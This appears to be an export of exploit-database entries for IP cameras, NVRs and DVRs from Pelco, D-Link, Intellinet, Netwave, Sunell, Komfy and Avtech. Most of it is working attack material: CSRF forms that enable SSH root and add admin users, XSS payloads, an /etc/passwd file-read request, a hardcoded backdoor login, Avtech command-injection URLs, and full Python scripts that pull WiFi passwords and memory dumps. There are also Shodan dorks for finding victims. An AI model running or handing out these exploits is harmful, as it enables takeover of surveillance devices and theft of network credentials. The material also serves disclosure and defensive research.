2017-07-10,WebApps,Hardware,LiquidWorm,Pelco Sarix/Spectra Cameras,Cross-Site Request Forgery (Enable SSH Root Access),"Summary: Pelco offers the broadest selection of IP cameras designed
Desc: The application interface allows users to perform certain actions","Schneider Electric Pelco Sarix/Spectra Cameras CSRF Enable SSH Root Access
Vendor: Schneider Electric SE
Product web page: https://www.pelco.com
Affected version: Sarix Enhanced - Model: IME219 (Firmware: 2.1.2.0.8280-A0.0)
Sarix Enhanced - Model: IME119 (Firmware: 2.1.2.0.8280-A0.0)
Sarix - Model: D5230 (Firmware: 1.9.2.23-20141118-1.9330-A1.10722)
Sarix - Model: ID10DN (Firmware: 1.8.2.18-20121109-1.9110-O3.8503)
Spectra Enhanced - Model: D6230 (Firmware: 2.2.0.5.9340-A0.0)
for security surveillance in a wide variety of commercial and industrial
settings. From our industry-leading fixed and high-speed IP cameras to
panoramic, thermal imaging, explosionproof and more, we offer a camera
for any environment, any lighting condition and any application.
When nothing but the best will do. Sarix™ Enhanced Range cameras
provide the most robust feature-set for your mission-critical applications.
With SureVision™ 3.0, Sarix Enhanced delivers the best possible image
in difficult lighting conditions such as a combination of bright areas,
shaded areas, and intense light. Designed with superior reliability,
fault tolerance, and processing speed, these rugged fixed IP cameras
ensure you always get the video that you need.
via HTTP requests without performing any validity checks to verify the
requests. This can be exploited to perform certain actions with administrative
privileges if a logged-in user visits a malicious web site.
Tested on: Linux 2.6.10_mvl401-1721-pelco_evolution #1 Tue Nov 18 21:15:30 EST 2014 armv5tejl unknown
MontaVista(R) Linux(R) Professional Edition 4.0.1 (0600980)
Lighttpd/1.4.28
PHP/5.3.0
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2017-5416
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5416.php
07.04.2017
CSRF enable ssh root access:
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action=""http://192.168.1.1/setup/network/ssh/update"" method=""POST"">
<input type=""hidden"" name=""enabled"" value=""1"" />
<input type=""hidden"" name=""password"" value=""root123"" />
<input type=""hidden"" name=""password&#95;confirmation"" value=""root123"" />
<input type=""submit"" value=""Go root"" />
</form>
</body>
</html>
CSRF add admin:
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action=""http://192.168.1.1/setup/auth/users/create"" method=""POST"">
<input type=""hidden"" name=""original&#95;username"" value="""" />
<input type=""hidden"" name=""mode"" value=""create"" />
<input type=""hidden"" name=""group"" value=""admins"" />
<input type=""hidden"" name=""username"" value=""pelco_admin"" />
<input type=""hidden"" name=""password"" value=""pelco_pass"" />
<input type=""hidden"" name=""password&#95;confirmation"" value=""pelco_pass"" />
<input type=""submit"" value=""Add admin"" />
</form>
</body>
</html>"
2017-07-10,WebApps,Hardware,LiquidWorm,Pelco Sarix/Spectra Cameras,Cross-Site Request Forgery / Cross-Site Scripting,"Summary: Pelco offers the broadest selection of IP cameras designed
Desc: Pelco cameras suffer from multiple dom-based, stored and reflected","Schneider Electric Pelco Sarix/Spectra Cameras Multiple XSS Vulnerabilities
Vendor: Schneider Electric SE
Product web page: https://www.pelco.com
Affected version: Sarix Enhanced - Model: IME219 (Firmware: 2.1.2.0.8280-A0.0)
Sarix Enhanced - Model: IME119 (Firmware: 2.1.2.0.8280-A0.0)
Sarix - Model: D5230 (Firmware: 1.9.2.23-20141118-1.9330-A1.10722)
Sarix - Model: ID10DN (Firmware: 1.8.2.18-20121109-1.9110-O3.8503)
Spectra Enhanced - Model: D6230 (Firmware: 2.2.0.5.9340-A0.0)
for security surveillance in a wide variety of commercial and industrial
settings. From our industry-leading fixed and high-speed IP cameras to
panoramic, thermal imaging, explosionproof and more, we offer a camera
for any environment, any lighting condition and any application.
When nothing but the best will do. Sarix™ Enhanced Range cameras
provide the most robust feature-set for your mission-critical applications.
With SureVision™ 3.0, Sarix Enhanced delivers the best possible image
in difficult lighting conditions such as a combination of bright areas,
shaded areas, and intense light. Designed with superior reliability,
fault tolerance, and processing speed, these rugged fixed IP cameras
ensure you always get the video that you need.
XSS vulnerabilities when input passed via several parameters to several
scripts is not properly sanitized before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a
user's browser session in context of an affected site.
Tested on: Linux 2.6.10_mvl401-1721-pelco_evolution #1 Tue Nov 18 21:15:30 EST 2014 armv5tejl unknown
MontaVista(R) Linux(R) Professional Edition 4.0.1 (0600980)
Lighttpd/1.4.28
PHP/5.3.0
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2017-5415
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5415.php
07.04.2017
CSRF/XSS on username parameter:
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action=""http://192.168.1.1/setup/network/dot1x/update"" method=""POST"">
<input type=""hidden"" name=""dot1x"" value=""on"" />
<input type=""hidden"" name=""protocol"" value=""EAP&#45;TLS"" />
<input type=""hidden"" name=""inner&#95;auth"" value=""CHAP"" />
<input type=""hidden"" name=""username"" value='""><script>alert(1)</script>' />
<input type=""hidden"" name=""password"" value=""blah"" />
<input type=""hidden"" name=""anonymous&#95;id"" value=""&#13;"" />
<input type=""hidden"" name=""ca&#95;certificate"" value=""test"" />
<input type=""hidden"" name=""client&#95;certificate"" value=""test"" />
<input type=""hidden"" name=""private&#95;key"" value=""test"" />
<input type=""hidden"" name=""private&#95;key&#95;password"" value=""test"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>
CSRF/XSS on gateway, hostname, ip_address, nameservers, http_port, rtsp_port and subnet_mask parameter:
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action=""http://192.168.1.1/setup/network/general/update"" method=""POST"">
<input type=""hidden"" name=""hostname"" value='""><script>alert(2)</script>' />
<input type=""hidden"" name=""http&#95;port"" value='""><script>alert(3)</script>' />
<input type=""hidden"" name=""rtsp&#95;port"" value='""><script>alert(4)</script>' />
<input type=""hidden"" name=""dhcp"" value=""off"" />
<input type=""hidden"" name=""ip&#95;address"" value='""><script>alert(5)</script>' />
<input type=""hidden"" name=""subnet&#95;mask"" value='""><script>alert(6)</script>' />
<input type=""hidden"" name=""gateway"" value='""><script>alert(7)</script>' />
<input type=""hidden"" name=""nameservers"" value='""><script>alert(8)</script>' />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>
CSRF/XSS on version parameter:
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action=""http://192.168.1.1/setup/network/snmp/update"" method=""POST"">
<input type=""hidden"" name=""version"" value='"";alert(9)//' />
<input type=""hidden"" name=""v2&#95;community&#95;string"" value=""public"" />
<input type=""hidden"" name=""v2&#95;receiver&#95;address"" value="""" />
<input type=""hidden"" name=""v2&#95;trap&#95;community&#95;string"" value=""trapbratce"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>
CSRF/XSS on device_name, ntp_server, region, smtp_server and zone parameter:
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action=""http://192.168.1.1/setup/system/general/update"" method=""POST"">
<input type=""hidden"" name=""device&#95;name"" value='ZSL""><script>alert(10)</script>' />
<input type=""hidden"" name=""enable&#95;leds"" value=""on"" />
<input type=""hidden"" name=""smtp&#95;server"" value='""><script>alert(11)</script>' />
<input type=""hidden"" name=""ntp&#95;server&#95;from&#95;dhcp"" value=""false"" />
<input type=""hidden"" name=""ntp&#95;server"" value=""';alert(12)//'"" />
<input type=""hidden"" name=""region"" value=""Macedonia';alert(13)//"" />
<input type=""hidden"" name=""zone"" value=""Kumanovo';alert(14)//"" />
<input type=""hidden"" name=""enable&#95;time&#95;overlay"" value=""on"" />
<input type=""hidden"" name=""enable&#95;name&#95;overlay"" value=""off"" />
<input type=""hidden"" name=""position"" value=""topright"" />
<input type=""hidden"" name=""date&#95;format"" value=""0"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>
XSS on ftp_base_path, ftp_server, ftp_username, ftp_password and name parameter:
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action=""http://192.168.1.1/setup/events/handlers/update"" method=""POST"">
<input type=""hidden"" name=""id"" value="""" />
<input type=""hidden"" name=""relay&#95;sentinel"" value=""relay&#95;sentinel"" />
<input type=""hidden"" name=""name"" value='""><script>alert(15)</script>' />
<input type=""hidden"" name=""type"" value=""Ftp"" />
<input type=""hidden"" name=""email&#95;to"" value="""" />
<input type=""hidden"" name=""email&#95;from"" value="""" />
<input type=""hidden"" name=""email&#95;subject"" value="""" />
<input type=""hidden"" name=""email&#95;message"" value="""" />
<input type=""hidden"" name=""dest&#95;name"" value=""IMG&#37;m&#37;d&#37;Y&#37;H&#37;M&#37;S&#46;jpg"" />
<input type=""hidden"" name=""limit&#95;size"" value="""" />
<input type=""hidden"" name=""limit&#95;size&#95;scale"" value=""K"" />
<input type=""hidden"" name=""ftp&#95;server"" value='""><script>alert(16)</script>' />
<input type=""hidden"" name=""ftp&#95;username"" value='""><script>alert(17)</script>' />
<input type=""hidden"" name=""ftp&#95;password"" value='""><script>alert(18)</script>' />
<input type=""hidden"" name=""ftp&#95;base&#95;path"" value='""><script>alert(19)</script>' />
<input type=""hidden"" name=""ftp&#95;dest&#95;name"" value=""IMG&#37;m&#37;d&#37;Y&#37;H&#37;M&#37;S&#46;jpg"" />
<input type=""hidden"" name=""relay&#95;bankName"" value=""GPIO"" />
<input type=""hidden"" name=""relay&#95;index"" value=""0"" />
<input type=""hidden"" name=""relay&#95;on&#95;time"" value=""0&#46;1"" />
<input type=""hidden"" name=""relay&#95;off&#95;time"" value=""0&#46;1"" />
<input type=""hidden"" name=""relay&#95;pulse&#95;count"" value="""" />
<input type=""hidden"" name=""filter&#95;start0"" value="""" />
<input type=""hidden"" name=""filter&#95;stop0"" value="""" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>"
2017-02-22,WebApps,Hardware,SlidingWindow,D-Link DCS Series Cameras,Insecure Crossdomain,"# Exploit Title: [Insecure CrossDomain.XML in D-Link DCS Series Cameras]
# Date: [22/02/2017]
# Exploit Author: [SlidingWindow] , Twitter: @Kapil_Khot
# Vendor Homepage: [http://us.dlink.com/product-category/home-solutions/view/network-cameras/]
# Version: [Tested on DCS-933L with firmware version 1.03. Other versions/models are also be affected]
# Tested on: [DCS-933L with firmware version 1.03]
# CVE : [CVE-2017-7852]
#Product:-
#Vulnerability:-
#Vulnerability Details:-
#Proof-of-Concept:-
#Vulnerability Disclosure Timeline:","Small and unobtrusive, SecuriCamô IP surveillance solutions from D-Link allow you to monitor your offices or warehouses from anywhere - at anytime. Extreme Low LUX optics, 2 way audio, and full pan/tilt/zoom manipulation provide everything an SMB needs to safeguard their valuable resources.
D-Link DCS series network cameras implement a weak CrossDomain.XML.
Insecure CrossDomain.XML in D-Link DCS Series Cameras (CVE-2017-7852)
D-Link DCS cameras have a weak/insecure CrossDomain.XML file that allows sites hosting malicious Flash objects to access and/or change the device's settings via a CSRF attack. This is because of the 'allow-access-from domain' child element set to *, thus accepting requests from any domain. If a victim logged into the camera's web console visits a malicious site hosting a malicious Flash file from another Browser tab, the malicious Flash file then can send requests to the victim's DCS series Camera without knowing the credentials. An attacker can host a malicious Flash file that can retrieve Live Feeds or information from the victim's DCS series Camera, add new admin users, or make other changes to the device. Known affected devices are DCS-933L with firmware before 1.13.05, DCS-5030L, DCS-5020L, DCS-2530L, DCS-2630L, DCS-930L, DCS-932L, and DCS-932LB1.
Vendor Response:-
In 2016 we phased in CSRF mitigation on all CGI on the cameras so an injection like this would not be allowed authenticated or unauthenticated. Please refer to the tracking table below which includes the H/W Revision and firmware when this CSRF mitigation was enabled.
DCS-2132L H/W ver:B F/W ver:2.12.00, DCS-2330L H/W ver:A F/W ver:1.13.00, DCS-2310L H/W ver:B, F/W ver:2.03.00, DCS-5029L H/W ver:A F/W ver:1.12.00,DCS-5222L H/W ver:B F/W ver:2.12.00, DCS-6212L H/W ver:A F/W ver:1.00.12, DCS-7000L H/W ver:A F/W ver:1.04.00, DCS-2132L H/W ver:A F/W ver:1.08.01, DCS-2136L H/W ver:A F/W ver:1.04.01, DCS-2210L H/W ver:A F/W ver:1.03.01, DCS-2230L H/W ver:A F/W ver:1.03.01, DCS-2310L H/W ver:A F/W ver:1.08.01, DCS-2332L H/W ver:A F/W ver:1.08.01, DCS-6010L H/W ver:A F/W ver:1.15.01, DCS-7010L H/W ver:A F/W ver:1.08.01, DCS-2530L H/W ver:A F/W ver:1.00.21, DCS-930L H/W ver:A F/W ver:1.15.04,DCS-930L H/W ver:B F/W ver:2.13.15, DCS-932L H/W ver:A  F/W ver:1.13.04, DCS-932L H/W ver:B  F/W ver:2.13.15, DCS-934L H/W ver:A  F/W ver:1.04.15, DCS-942L H/W ver:A  F/W ver:1.27, DCS-942L H/W ver:B  F/W ver:2.11.03, DCS-931L H/W ver:A  F/W ver:1.13.05, DCS-933L H/W ver:A  F/W ver:1.13.05, DCS-5009L H/W ver:A  F/W ver:1.07.05, DCS-5010L H/W ver:A  F/W ver:1.13.05, DCS-5020L H/W ver:A  F/W ver:1.13.05, DCS-5000L H/W ver:A  F/W ver:1.02.02, DCS-5025L H/W ver:A  F/W ver:1.02.10, DCS-5030L H/W ver:A  F/W ver:1.01.06
1. Build a Flash file 'FlashMe.swf' using Flex SDK which would access Advance.htm from target device and send the response to attackerís site.
2. Upload 'FlashMe.swf' to the webroot of attacking machine.
3. Log into the Cameraís web console.
4. From another tab in the same browser visit http://attackingsiteip.com/FlashMe.swf
5. Flash object from Request#4 sends a GET request to http://CameraIP/advanced.htm
6. Flash object receives response from Camera and forwards it to http://attackingsiteip.com/
7. Sensitive information like Live Feed, WiFi password etc can be retrieved or new admin users can be added.
22/02/2017: First email to disclose the vulnerability to the D-Link incident response team
17/03/2017: Vendor responded stating that this attack would not work due to recently added CSRF mitigation.Shipped two different models running latest firmware for testing.
26/03/2017: Confirmed the fix after testing latest firmware. The 'Referer' header based CSRF protection mitigates this attack which cannot be bypassed unless there is a browser vulnerability.
24/04/2017: Published CVE-2017-7852"
2017-04-07,WebApps,Hardware,Dimitri Fousekis,Intellinet NFC-30IR Camera,Multiple Vulnerabilities,"http://www.bitcrack.net
#ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
# MFT: Specify manufacture commands user name and password","Bitcrack Cyber Security - BitLabs Advisory
Multiple Vulnerabilities in Intellinet NFC-30IR Network Cameras
ADVISORY
Title: Local File Inclusion in CGI-SCRIPT & Hard-Coded Manufacturer Backdoor
Advisory ID: BITL-17-001
Date published: 2017-04-05
Date of last update: 2017-04-05
Vendors contacted: Intellinet
VULNERABILITY
Type: Local File Inclusion (LFI)(Authenticated) & Hardcoded Manufacturer Backdoor
Risk/Impact: Access to sensitive files & Access control bypass.
Exploitation Type : Remote
CVE Name: CVE-2017-7461 and CVE-2017-7462
DESCRIPTION
We found two vulnerabilities affecting the Intellinet NFC-30IR Camera with
firmware version LM.1.6.16.05
1. [CVE-2017-7461] once authenticated as admin:admin, you can read local files
by requesting the '/cgi-bin/admin/fileread?READ.filePath=<insert here>'
Instead of the developer using server-side scripts to render information, it takes the
plain text files and uses /fileread CGI script to simply return the plain text - the
site then relies on Javascript to ""format"" the text into something pretty.
There is no sanitization nor lock-down of what paths that script can read, hence all
files can be viewed. Interesting files to request are; /etc/passwd; /etc/boa.conf and more.
2. [CVE-2017-7462] a manufacturer backdoor exists that allows one to access a script
called '/cgi-bin/mft/manufacture' by authenticating as manufacture:erutcafunam
This binary has been analyzed before by other vendors. We did not analyze it again as we
feel this is the same file used in other cameras. Note that the NFC-30IR does NOT have the
wireless_mft executable.
The hard-coded manufacturer user:pass is manufacture:erutcafunam as shown in the
below boa.conf snippet;
--snip--
ScriptAlias /cgi-bin/operator/ /opt/cgi/operator/
ScriptAlias /cgi-bin/view/ /opt/cgi/view/
ScriptAlias /cgi-bin/admin/ /opt/cgi/admin/
ScriptAlias /cgi-bin/jpg/ /opt/cgi/jpg/
ScriptAlias /cgi-bin/ /opt/cgi/
ScriptAlias /jpg /opt/cgi/jpg
MFT manufacture erutcafunam
--snip--
This indicates that the camera hardware may be some kind of modified/stripped version
of a Zavio board.
VENDOR RESPONSE/NOTIFICATION
Vendor was given 7 days to respond, and 3 written notifications.
No response received nor acknowledgement.
Vendor has not released updates to fix the vulnerabilities.
CREDITS
Vulnerabilities discovered by Dimitri Fousekis/RuraPenthe
Additional information on how the manufacture CGI executable works was obtained by
information written by Core Security/Francisco Falcon.
PROOF OF CONCEPT CODE
LOCAL FILE INCLUSION THROUGH CGI FILE READER
GET /cgi-bin/admin/fileread?READ.filePath=/etc/passwd HTTP/1.1
Host: 10.0.0.21
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
If-Modified-Since: Sat, 1 Jan 2000 00:00:00 GMT
Referer: http://10.0.0.21/system_info.htm
Cookie: VideoFmt=3
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
ABOUT BITLABS
BitLabs is the research division of Bitcrack Cyber Security, a South African & Mauritian
based cyber security company. We specialize in providing our clients with research and
information to combat current and future attacks on their systems and devices.
BitLabs focuses primarily on IoT device research, identifying vulnerabilities and other
attack vectors that can impact users of these devices negatively.
Our Web address is at : http://www.bitcrack.net
DISCLAIMER INFO
All content of this advisory is Copyright (C) 2017 Bitcrack Cyber Security,
and are licensed under a Creative Commons Attribution Non-Commercial 3.0
(South Africa) License: http://za.creativecommons.org/ and other countries as and when
stipulated."
2017-02-03,Remote,Hardware,spiritnull,Netwave IP Camera,Password Disclosure,"#!/usr/bin/python2.7
## spiritnull(at)sigaint.org
## Run the exploit against the victim to get WIFI password
## If the victim is vulnerable to memory leak it will try to extract the username and password for the weblogin
## magic for you bash:
## wget -qO- http://[HOST]:[PORT]//proc/kcore | strings
## wget -qO- http://[HOST]:[PORT]//etc/RT2870STA.dat
## wget -qO- http://[HOST]:[PORT]//dev/rom0
## wget -qO- http://[HOST]:[PORT]/get_status.cgi
## shodan dork:
## ""Server: Netwave IP Camera""
## zoomeye dork:
## Netwave IP camera http config","import sys,os,time,tailer
import urllib2
import subprocess
import signal
from threading import Thread
try:
if sys.argv[1] == ""-h"" or sys.argv[1] == ""--help"":
print ""Usage: python pownetwave.py [HOST]:[PORT]""
print ""Example: python pownetwave.py 127.0.0.1:81""
sys.exit(0)
else:
pass
except IndexError:
print ""Usage: python pownetwave.py [HOST]:[PORT]""
print ""Example: python pownetwave.py 127.0.0.1:81""
sys.exit(0)
def signal_handler(signal, frame):
print('\nclearing up..')
os.system(""rm -rf tmpstream.txt"")
os.system(""rm -rf tmpstrings.out"")
os.system(""killall -9 wget"")
os.system(""killall -9 tail"")
sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)
macaddr = """"
done = 0
linecount = 0
class bcolors:
HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
print ""getting system information..""+sys.argv[1]
response = urllib2.urlopen('http://'+sys.argv[1]+'/get_status.cgi')
xcontent = response.read().split("";\n"")
for line in xcontent:
if line.startswith(""var id=""):
line = line.split(""'"")
macaddr = line[1]
else:
pass
print ""victims MAC-ADDRESS: ""+bcolors.OKGREEN+str(macaddr)+bcolors.ENDC
print ""getting wireless information..""
try:
resp = urllib2.urlopen(""http://""+sys.argv[1]+""//etc/RT2870STA.dat"")
xcontent = resp.read().split(""\n"")
print ""victims wireless information..""
for line in xcontent:
if line.startswith(""WPAPSK"") or line.startswith(""SSID""):
print ""\t\t""+bcolors.OKGREEN+str(line)+bcolors.ENDC
else:
print ""\t\t""+str(line)
except:
print ""wireless lan is disabled..""
print ""checking for memory dump vulnerability..""
try:
urllib2.urlopen('http://'+sys.argv[1]+'//proc/kcore')
except:
print bcolors.FAIL+""victim isnt vulnerable for a memory leak, exiting..""+bcolors.ENDC
sys.exit(0)
print ""starting to read memory dump.. ""+bcolors.WARNING+""this could take a few minutes""+bcolors.ENDC
proc = subprocess.Popen(""wget -qO- http://""+sys.argv[1]+""//proc/kcore > tmpstream.txt"", shell=True, preexec_fn=os.setsid)
os.system('echo """" >tmpstrings.out')
time.sleep(1)
proc2 = subprocess.Popen(""tail -f tmpstream.txt | strings >>tmpstrings.out"", shell=True, preexec_fn=os.setsid)
print bcolors.BOLD+""hit CTRL+C to exit..""+bcolors.ENDC
while 1:
sys.stdout.flush()
if os.stat('tmpstrings.out').st_size <= 1024:
sys.stdout.write(""binary data: ""+str(os.stat('tmpstream.txt').st_size)+""\r"")
else:
sys.stdout.flush()
print ""strings in binary data found.. password should be around line 10000""
for line in tailer.follow(open('tmpstrings.out','r')):
sys.stdout.flush()
if done == 0:
linecount+= 1
if line == macaddr:
sys.stdout.flush()
done = 1
print bcolors.OKGREEN+""\n\nmac address triggered.. printing the following dumps, could leak username and passwords..""+bcolors.ENDC
else:
sys.stdout.write(str(linecount)+""\r"")
elif done == 1:
done = 2
print ""\nfirstline.. ""+bcolors.OKGREEN+line+bcolors.ENDC
elif done == 2:
done = 3
print ""possible username: ""+bcolors.OKGREEN+line+bcolors.ENDC
elif done == 3:
done = 4
print ""possible password: ""+bcolors.OKGREEN+line+bcolors.ENDC
elif done == 4:
done = 0
print ""following line.. \n\n""+bcolors.OKGREEN+line+bcolors.ENDC
else:
pass
signal.pause()"
2016-11-02,DoS,Hardware,qwsj,SunellSecurity NVR / Camera,Denial of Service,"# Exploit Title: SunellSecurity NVR / Cams - Buffer overflow in CGI
# Date: 11.2.2016
# Exploit Author: qwsj
# Vendor Homepage: https://github.com/qwsj
# Version: 1.6.08-09 / 2.0.06-08
# Tested on: Windows / Linux
# For NVR:
# For Cams:
# Eg: http://IP/cgi-bin/image.cgi?userNameug in CGI scrypt's for develop.
Web service buffer overflow and leading to a stop web service, and the device rebooted.
Symbols
Version firmware:
1.6.0902.0000.3.0.29.0.0
1.6.0802.0000.0.0.2906.1.0
Use link: http://IP/cgi-bin/videoStream.cgi?userName=
Version firmware:
2.0.0601.1002.3.0.56.0.1_TD
2.0.0801.1002.1.1.125.0.0
2.0.0601.1002.3.0.33.0.12
Use link: http://IP/cgi-bin/image.cgi?userName=
ЯR qwsj 2016"
2016-10-26,Remote,Hardware,Jason Doyle,Komfy Switch with Camera DKZ-201S/W,WiFi Password Disclosure,"#!/usr/bin/python
# Exploit Title: Komfy Switch with Camera Wifi Password Disclosure via Bluetooth BLE
# Date: Oct 13, 2016
# Exploit Author: Jason Doyle @_jasondoyle
# Vendor Homepage: http://us.dlink.com/products/connected-home/komfy-switch-with-camera/
# HW Model: DKZ-201S/W
# SW Version: 1.0
# Tested on: Ubuntu 16.04 LTS / Python 2.7
# Disclosure Timeline: 10/11/16 Reported vulnerability to D-Link
#                      10/11/16 D-Link responded - The Komfy switch will be discontinued 12/30/16. No fix planned.
# Vulnerability Summary
#It is possible for an unauthenticated, remote attacker to retrieve the Komfy device's associated wifi ssid and password over bluetooth (4.0/BLE).
# Vulnerability Details
#https://github.com/jasondoyle/Komfy-Switch-Wifi-Password-Disclosure
# Author: Jason Doyle @_jasondoyle
# Komfy Switch with Camera wifi password disclosure exploit script
#lookup table to unscramble
#request SSID
#request komfy encoded wifi password
#convert password to real base64","import re, base64
from bluepy.btle import Scanner
from gattlib import GATTRequester
base64Alphabet =  ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="" # '=' used for padding
komfy64Alphabet = ""qazwersdfxcvbgtyhnmjklpoiu5647382910+/POIKLMJUYTGHNBVFREWSDCXZAQ$"" # '$' used for padding
scanner = Scanner()
devices = scanner.scan(5.0)
bAddr = """"
for dev in devices:
if ""6c:72:20"" in dev.addr and dev.getValueText(1) and dev.getValueText(7) and dev.getValueText(9):
bAddr = dev.addr
print ""[+] Komfy switch found: %s (%s), RSSI=%d dB"" % (dev.addr, dev.addrType, dev.rssi)
if not bAddr:
print ""No Komfy switches found""
sys.exit(1)
req = GATTRequester(bAddr.encode('ascii','ignore'), False, 'hci0')
req.connect(True, 'public', 'none', 0, 78)
wifiSsid = req.read_by_uuid(""0xb006"")[0]
reg = re.search(r""(:\s\""(.*)\"")"", wifiSsid)
wifiSsid = reg.groups()[1].replace(""\\"","""")
wifiPassKomfy64 = req.read_by_uuid(""0xb007"")[0]
reg = re.search(r""(:\s\""(.*)\"")"", wifiPassKomfy64)
wifiPassKomfy64 = reg.groups()[1].replace(""\\"","""")
wifiPassBase64 = """"
for char in wifiPassKomfy64:
i = komfy64Alphabet.index(char)
wifiPassBase64 += base64Alphabet[i]
wifiPass = base64.b64decode(wifiPassBase64)
print ""[+] Wifi password found for Komfy Switch [%s] SSID: %s Password: %s"" % (bAddr, wifiSsid, wifiPass)"
2016-10-11,WebApps,CGI,Gergely Eberhardt,AVTECH IP Camera / NVR / DVR Devices,Multiple Vulnerabilities,"http://<device_ip>/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==
http://<device_ip>/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=LW==&username=admin%20;XmlAp%20r%20Account.User1.Password>$(ps|grep%20Search.cgi|grep%20-v%20grep|head%20-n%201|awk%20'{print%20""/tmp/""$1"".log""}');&password=admin
http://<device_ip>/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*
http://<device_ip>/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*
http://<device_ip>/cgi-bin/nobody/VerifyCode.cgi?account=<b64(username:password)>&login=quick
http://<device_ip>/cgi-bin/supervisor/PwdGrp.cgi?action=add&user=test&pwd=;reboot;&grp=SUPERVISOR&lifetime=5%20MIN
https://www.search-lab.hu/advisories/126-avtech-devices-multiple-vulnerabilities
# POC code for Technicolor Avtech devices
# Demonstrates the following vulnerabilities
#  - Unauthenticated information leakage (capabilities)
#  - Authentication bypass (.cab, nobody)
#  - Unauthenticated SSRF on DVR devices
#  - Unauthenticated command injection on DVR devices
#  - Login captcha bypass with login=quick or manual cookie creation
#  - CloudSetup.cgi command injection after authentication
#  - adcommand.cgi command injection after authentication
# Credit: Gergely Eberhardt (@ebux25) from SEARCH-LAB Ltd. (www.search-lab.hu)
# Advisory: http://search-lab.hu/...
# creates a valid cookie without logging in
# performs authentication with the provided user name and password using
# the login=quick parameter, which bypass the captcha verification
#print 'Authentication failed with %s:%s'%(self.username,self.password)
#print 'Authentication succeeded with %s:%s'%(self.username,self.password)
#else:
#    print 'Unknown response code: %d'%(int(res[0]))
# verifies whether the authentication bypass is working .cab or /nobody problem
# .cab check
# /nobody check
# retrieves account information after authentication
# retrieves firmware version after authentication
# retrieves login response after authentication
# CloudSetup.cgi command injection test
# adcommand.cgi command injection test
# parses capability response
# unauthenticated information leakage
# checks the availability of search.cgi (available only on DVR devices)
# unauthenticated SSRF using the search.cgi script (available only on DVR devices)
# unauthenticated command injection in the search.cgi script (available only on DVR devices)
# unatuhenticated information disclosure
# check unauthenticated SSRF vulnerability
# authentication bypas
# try default password
# login with credentials using captch bypass
# if captch bypass was not possible, but we have a password, set cookie manually
# check issues after authentication","Avtech devices multiple vulnerabilities
Platforms / Firmware confirmed affected:
- Every Avtech device (IP camera, NVR, DVR) and firmware version. [4]
contains the list of confirmed firmware versions, which are affected.
- Product page: http://www.avtech.com.tw/
ôAVTECH, founded in 1996, is one of the worldÆs leading CCTV
manufacturers. With stably increasing revenue and practical business
running philosophy, AVTECH has been ranked as the largest public-listed
company among the Taiwan surveillance industry. AVTECH makes every
effort on the innovation of technology, product and implementation.
Based on years of research and industry experience, AVTECH has obtained
a leading position on mobile platform support and provides a full range
of surveillance products.ö
Avtech is the second most popular search term in Shodan. According to
Shodan, more than 130.000 Avtech devices are exposed to the internet.
Vulnerabilities
1) Plaintext storage of administrative password
Every user password is stored in clear text. An attacker with access to
the device itself can easily obtain the full list of passwords. By
exploiting command injection or authentication bypass issues, the clear
text admin password can be retrieved.
2) Missing CSRF protection
The web interface does not use any CSRF protection. If a valid session
exists for the user, the attacker can modify all settings of the device
via CSRF. If there is no valid session, but the user did not change the
default admin password, the attacker can log in as admin via CSRF as well.
3) Unauthenticated information disclosure
Under the /cgi-bin/nobody folder every CGI script can be accessed
without authentication.
POC: GET /cgi-bin/nobody/Machine.cgi?action=get_capability
Example response:
Firmware.Version=1011-1005-1008-1002
MACAddress=00:0E:53:xx:xx:xx
Product.Type=DVR
Product.ID=308B
Product.ShortName=V_full_Indep,V_Multistream
Video.System=PAL
Audio.DownloadFormat=ULAW
Video.Input.Num=8
Video.Output.Num=1
Video.Format=H264,MJPEG
Video.Format.Default=H264
Video.Resolution=4CIF,CIF
Video.Quality=BEST,HIGH,NORMAL,BASIC
Video.Local.Input.Num=8
Video.Local.Output.Num=1
Video.Local.Format=H264,MJPEG
Audio.Input.Num=8
Audio.Output.Num=1
Audio.Format=ULAW
Audio.Local.Input.Num=8
Audio.Local.Output.Num=1
Audio.Local.Format=PCM
Language.Default=ENGLISH
Language.Support=ENGLISH&CHINESE&JAPANESE&FRANCE&GERMAN&SPANISH&PORTUGUESE&ITALIAN&TURKISH&POLISH&RUSSIAN&CUSTOMIZE&THAI
&VIETNAM&DUTCH&GREEK&ARABIC&CZECH&HUNGARIAN&HEBREW&CHINA&
Capability=D0,80,A,80
PushNotify.MaxChannel=8
4) Unauthenticated SSRF in DVR devices
In case of DVR devices, Search.cgi can be accessed without
authentication. This service is responsible for searching and accessing
IP cameras in the local network. In newer firmware versions, Search.cgi
